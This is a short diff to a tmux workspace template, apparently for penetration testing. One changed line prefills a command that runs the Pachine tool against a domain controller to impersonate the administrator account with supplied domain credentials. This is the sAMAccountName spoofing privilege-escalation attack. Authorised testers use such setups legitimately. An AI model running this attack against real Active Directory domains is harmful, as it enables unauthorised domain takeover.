@@ -79,7 +79,7 @@ windows:
         - exploit:
           - tmux select-pane -T 'exploit' -t "authd:samTheAdmin.1"
           - cd /opt/nomad-tools/
-          - <%= @settings["prefill"] %> "cd Pachine; pipenv run python3 pachine.py -dc-host <%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"
+          - <%= @settings["prefill"] %> "cd Pachine; pipenv run python3 pachine.py -dc-host ADD_NETBIOS_NAME.<%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; clear; echo -e "\e[0;32mUpdate DC Netbios name\033[0m"; cat <%= @settings["rootDir"] %>/dcIP.txt; dig <%= @settings["rootDir"] %>/dcIP.txt | head -n 1
   - bloodhound: 
       panes:
         - bloodhound:
